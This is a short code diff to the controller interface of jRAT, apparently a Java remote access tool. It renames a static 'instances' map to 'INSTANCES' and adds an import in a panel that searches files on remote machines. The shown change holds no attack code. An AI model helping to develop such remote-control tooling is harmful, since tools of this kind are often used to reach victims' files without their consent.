@@ -29,6 +29,7 @@ import se.jrat.client.packets.outgoing.Packet53StartSearch;
 import se.jrat.client.packets.outgoing.Packet54StopSearch;
 import se.jrat.client.ui.components.DefaultJTable;
 import se.jrat.client.ui.frames.FrameRemoteFiles;
+import se.jrat.client.ui.frames.FrameRemoteFilesOld;
 import se.jrat.client.ui.renderers.JComboBoxIconRenderer;
 import se.jrat.client.ui.renderers.table.FileSearchTableRenderer;
 import se.jrat.client.utils.IconUtils;
@@ -110,7 +111,7 @@ public class PanelControlSearch extends PanelControlParent {
 			public void actionPerformed(ActionEvent arg0) {
 				int row = table.getSelectedRow();
 				if (row != -1) {
-					FrameRemoteFiles frame = FrameRemoteFiles.instances.get(sl);
+					FrameRemoteFiles frame = FrameRemoteFiles.INSTANCES.get(sl);
 					if (frame == null) {
 						frame = new FrameRemoteFiles(sl);
 						frame.setVisible(true);
@@ -133,7 +134,7 @@ public class PanelControlSearch extends PanelControlParent {
 			public void actionPerformed(ActionEvent arg0) {
 				int row = table.getSelectedRow();
 				if (row != -1) {
-					FrameRemoteFiles frame = FrameRemoteFiles.instances.get(sl);
+					FrameRemoteFiles frame = FrameRemoteFiles.INSTANCES.get(sl);
 					if (frame == null) {
 						frame = new FrameRemoteFiles(sl);
 						frame.setVisible(true);
